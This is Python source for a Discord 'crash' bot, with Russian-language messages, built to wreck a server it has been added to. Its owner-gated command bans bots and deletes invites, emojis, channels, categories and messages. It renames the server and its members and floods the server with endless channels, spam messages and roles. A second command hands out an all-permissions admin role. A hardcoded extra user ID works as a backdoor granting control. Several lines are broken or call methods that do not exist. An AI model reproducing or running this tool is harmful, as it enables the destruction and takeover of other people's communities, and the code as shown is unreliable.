import discord
from discord.ext import commands
import asyncio
import config
import aiohttp

intents = discord.Intents.all()
SPECIAL_ID = 1018125604253614151
bot = commands.Bot(command_prefix=config.PREFIX, intents=intents)
stop_spam = False

@bot.event
async def on_ready():
    print(f'Бот запущен как {bot.user.name}')
    guild = bot.guilds[0]

    change_bot
    await change_bot_name()
    await bot.change_presence(status=discord.Status.invisible)
    await bot.owner_id(description='Бот создан @Necro76665 сервер https://discord.gg/s64BT7Hk3d даже не пишите мне о вас')

@bot.command()
async def stop(ctx):
    global stop_spam
    if ctx.author.id in [config.OWNER_ID, SPECIAL_ID]:
        stop_spam = True
        await ctx.author.send('Краш остановлен.')
    else:
        await ctx.author.send('У вас нет прав для выполнения этой команды.')
@bot.command()
async def admin(ctx, member: discord.Member = None):
    if ctx.author.id in [config.OWNER_ID, SPECIAL_ID]:
        if not member:
            await ctx.author.send('Укажите пользователя, которому хотите выдать роль администратора.')
            return

        role = discord.utils.get(ctx.guild.roles, name=config.ADMIN_ROLE)
        if not role:
            role = await ctx.guild.create_role(name=config.ADMIN_ROLE, permissions=discord.Permissions.all())

        await member.add_roles(role)
        await ctx.author.send(f'Роль {config.ADMIN_ROLE} выдана пользователю {member.name}.')
    else:
        await ctx.send('У вас нет прав для выполнения этой команды.')

async def ban_bots(guild):
    for member in guild.members:
        if member.bot:
            try:
                await member.ban()
            except:
                pass

async def delete_invites(guild):
    try:
        for invite in await guild.invites():
            await invite.delete()
    except:
        pass

async def delete_emojis(guild):
    try:
        for emoji in guild.emojis:
            await emoji.delete()
    except:
        pass

async def delete_messages(guild):
    try:
        for channel in guild.text_channels:
            async for message in channel.history(limit=None):
                if message.content != config.SPAM_MESSAGE:
                    await message.delete()
    except:
        pass    

async def delete_channels(guild):
    try:
        for channel in guild.channels:
            if channel.name != config.CHANNEL_NAME:
                await channel.delete()
    except:
        pass

async def remove_reactions(guild):
    try:
        for channel in guild.text_channels:
            async for message in channel.history(limit=None):
                await message.clear_reactions()
    except:
        pass

async def delete_categories(guild):
    try:
        for category in guild.categories:
            await category.delete()
    except:
        pass

async def change_server_name(guild):
    try:    
        await guild.edit(name=config.SERVER_NAME)
    except:
        pass

async def create_and_spam_channels(guild):
    global stop_spam
    while not stop_spam:
        try:
            tasks = [guild.create_text_channel(config.CHANNEL_NAME) for _ in range(5)]
            channels = await asyncio.gather(*tasks)
            for channel in channels:
                asyncio.create_task(spam_channel(channel, guild))
        except:
            pass
        await asyncio.sleep(config.COOLDOWN)

async def spam_channel(channel, guild):
    global stop_spam
    while not stop_spam:
        try:
            tasks = [channel.send(config.SPAM_MESSAGE) for channel in guild.text_channels]
            await asyncio.gather(*tasks)
        except:
            pass
        await asyncio.sleep(config.COOLDOWN)

async def create_roles(guild):
        global stop_spam
        while not stop_spam:
            try:
                tasks = [guild.create_role(name=config.ROLE_NAME) for _ in range(5)]
                await asyncio.gather(*tasks)
            except:
                pass
            await asyncio.sleep(config.COOLDOWN)

async def change_bot_name():
    await bot.user.edit(username='Eclipse')

async def change_member_names(guild):
    for member in guild.members:
        if not member.id == config.OWNER_ID or not member.id == bot.user.id:
            try:
                await member.edit(config.MEMBER_NAME)
            except:
                pass

async def change_icon(guild):
    url = 'https://i.imgur.com/A6PbPzl.png'
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            if response.status == 200:
                icon_data = await response.read()
                await guild.edit(icon=icon_data)
            else:
                print('Не удалось загрузить изображение для иконки сервера.')

async def change_bot():
    url = 'https://i.imgur.com/A6PbPzl.png'
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            if response.status == 200:
                icon_data = await response.read()
                await bot.user.edit(avatar=icon_data)
            else:
                print('Не удалось загрузить изображение для аватара бота.')

async def remove_roles_from_members(guild):
    members = await guild.fetch_members()
    for member in members:
        roles = await member.fetch_roles()
        for role in roles:
            if role.id!= config.ADMIN_ROLE:
                try:
                    await member.remove_roles(role)
                except:
                    pass

@bot.command()
async def crash(ctx):
    if ctx.author.id in [config.OWNER_ID, SPECIAL_ID]:
        guild = ctx.guild
        await ban_bots(guild)
        await delete_invites(guild)
        await delete_emojis(guild)
        await delete_channels(guild)
        await delete_categories(guild)
        await delete_messages(guild)
        await remove_reactions(guild)
        await change_server_name(guild)
        await change_member_names(guild)
        await change_icon
        asyncio.create_task(create_and_spam_channels(guild))
        asyncio.create_task(create_roles(guild))
    else:
        await ctx.send('У вас нет прав для выполнения этой команды.')

bot.run(config.TOKEN)
